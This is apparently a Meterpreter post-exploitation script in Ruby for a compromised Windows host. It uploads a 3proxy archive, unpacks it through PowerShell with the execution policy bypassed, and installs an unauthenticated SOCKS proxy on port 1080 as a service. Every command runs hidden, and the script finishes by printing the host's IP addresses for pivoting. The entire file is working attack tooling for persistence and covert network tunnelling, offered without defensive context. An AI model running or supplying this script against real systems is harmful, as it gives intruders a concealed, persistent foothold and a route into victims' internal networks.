# Uploads 3proxy.zip in /opt/3proxy to the server and installs it as a service.
# The proxy will be a socks proxy on port 1080 without authentication by default

# A function to upload files
def upload(session,file,file_name,path,trgloc = nil)
    if not ::File.exists?(file)
            raise "File to Upload does not exist!"
        else
        if trgloc == nil
        location = session.fs.file.expand_path(path)
        else
            location = trgloc
        end
        begin
            fileontrgt = "#{path}#{file_name}"
            print_status("Uploading #{file} to #{path}")
            session.fs.file.upload_file("#{fileontrgt}","#{file}")
            print_status("#{file} uploaded!")
        rescue ::Exception => e
            print_status("Error uploading file #{file}: #{e.class} #{e}")
        end
    end
    return fileontrgt
end

# Read the output of an executed command, then close the connection
def read_output(r)
	while(d = r.channel.read)
        print_status("t#{d}")
    end
    r.channel.close
    r.close
end

# Create Directories
print_status("Creating paths")
r = session.sys.process.execute('cmd /c mkdir "c:\temp"', nil, {'Hidden' => true, 'Channelized' => true})
r = session.sys.process.execute('cmd /c mkdir "c:\temp\3proxy"', nil, {'Hidden' => true, 'Channelized' => true})

# Upload the zip file
upload(client,"/opt/3proxy/3proxy.zip", "3proxy.zip", "c:\\temp\\3proxy\\")

# Extract it
print_status("Extracting files")
r = session.sys.process.execute('powershell -executionpolicy bypass -command Expand-Archive -LiteralPath c:\temp\3proxy\3proxy.zip -DestinationPath c:\temp\3proxy\ ', nil, {'Hidden' => true, 'Channelized' => true})
read_output(r)

# Install and start 3proxy
print_status("Installing and starting the socks proxy as a service")
r = session.sys.process.execute('cmd /c "c:\temp\3proxy\bin\3proxy.exe --install c:\temp\3proxy\cfg\3proxy.cfg"', nil, {'Hidden' => true, 'Channelized' => true})
read_output(r)

# Final message
print_status("Socks proxy accessible on port 1080 on the following addresses")
r = session.sys.process.execute('ipconfig | findstr /r "[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*" | findstr "IPv4 Address" | findstr -v "Auto"', nil, {'Hidden' => true, 'Channelized' => true})
read_output(r)